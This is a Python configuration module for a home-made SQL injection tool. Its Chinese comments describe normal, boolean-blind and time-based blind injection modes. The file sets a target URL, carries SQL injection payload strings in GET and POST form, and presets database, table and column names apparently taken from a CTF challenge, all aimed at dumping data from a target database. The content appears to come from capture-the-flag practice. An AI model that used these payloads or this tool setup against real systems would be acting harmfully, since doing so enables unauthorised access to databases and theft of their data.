#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
from bs4 import BeautifulSoup
from lib.log import logger
__author__ = "LoRexxar"


'''
若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4
需要注意的是，这里输入为r.text.encode('utf-8'), return必须为查询返回值，不能多标签符号等
def UnpackFunction(self, r):
    index = r.find('<td>')
    index2 = r[index + 4:].find('</td>')
    return r[index + 4:][:index2]

bs4
def UnpackFunction(r):
    soup = BeautifulSoup(r, "lxml")
    r = soup.find_all("td")[1].string
    return r
'''


def UnpackFunction(r):
    # index = r.find('<td>')
    # index2 = r[index + 4:].find('</td>')
    soup = BeautifulSoup(r, "lxml")
    r = soup.prettify()
    try:
        r = soup.find_all("td")[1].string
    except IndexError:
        logger.error("UnpackFunction error...")
        exit(0)
    return r


class BaseConfig:
    def __init__(self):
        """
        基类初始化，整个注入工具的核心配置
        """
        self.version = "V0.8.0"

        # 目标url
        self.url = 'http://demo.lorexxar.pw/get.php'
        self.s = requests.Session()

        # 传参方式 0为GET 1为POST
        SqliRequest = (
            "GET",
            "POST"
        )
        self.sqlirequest = SqliRequest[0]

        '''
        当传参方式为GET
        payload传入为键值对方式
        example: username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In
        '''
        self.payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"

        '''
        当传参方式为POST
        payload传入方式为字典
        example: payload = {"username": "ddog' or select database()%23", "password": "a"}
        self.payload = {"username": "ddog' or select database()%23", "password": "a"}
        '''

        # 注入方式 0为正常 1为盲注 2为时间盲注
        SqliMethod = (
            "normal",
            "build",
            "time"
        )
        self.sqlimethod = SqliMethod[1]

        # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面

        '''
        若注入方式为build盲注，则通过返回长度判断
        永真条件的长度（盲注时需要使用）test类中test可跑，默认为0，可设置
        '''
        self.len = 0

        '''
        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
        建议2-5，现在版本还是单线程，所以时间盲注会非常慢非常慢...
        '''
        self.time = 2

        '''
        在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user

        self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启

        而testmethod则是选择使用那种测试，互相兼容可以同时跑
        '''
        self.wtest = False

        self.testmethod = {
            "test": 0,
            "database": 1,
            "version": 1,
            "user": 1
        }
        '''
        正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启

        all为全部注入，将自动从database注入直到数据前10条
        content为注入数据，可以预设columns、tables和database
        columns为注入列名，可以预设tables和database
        tables为注入表名，可以预设database
        database为注入表名
        统一规则为如果不预设，则自动调用上一层的类获取数据
        '''
        self.wsqli = True

        self.sqlilocation = {
            "content": 1,
            "columns": 1,
            "tables": 1,
            "database": 1
        }

        '''
        database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式
        self.databases_name = ['test', 'test2']（当然，如果database_name错误...则不会注到数据）
        '''
        # self.databases_name = ['hctfsqli1', 'test']
        self.databases_name = []

        '''
        然后是table name，tables_name的格式为字典+元组
        self.tables_name = {'hctfsqli1': ('test1', 'test2'), 'test',('test1', 'test2')}(如果有写错某些值，则会注不到数据)
        '''
        self.tables_name = {'test': ('test',), 'hctfsqli1': ('hhhhctf', 'test', 'users')}
        # self.tables_name = {}

        '''
        然后是self.columns_name，columns_name的格式为字典套字典+元组
        self.columns_name = {'test': {'test': ('test', 'test1', 'test2')}, 'test2': {'test': ('test', 'test1', 'test2')}}
        (同样，如果有写错的值，则会注入不到数据)
        '''
        self.columns_name = {'test': {'test': ('test',)}, 'hctfsqli1': {'test': ('test1', 'testtest', 'flag1'), 'users': ('id', 'username'), 'hhhhctf': ('flag',)}}
        # self.columns_name = {}

        '''
        当选择注入content时，你需要指定输入数据的上限，默认为10
        '''
        self.content_count = 10

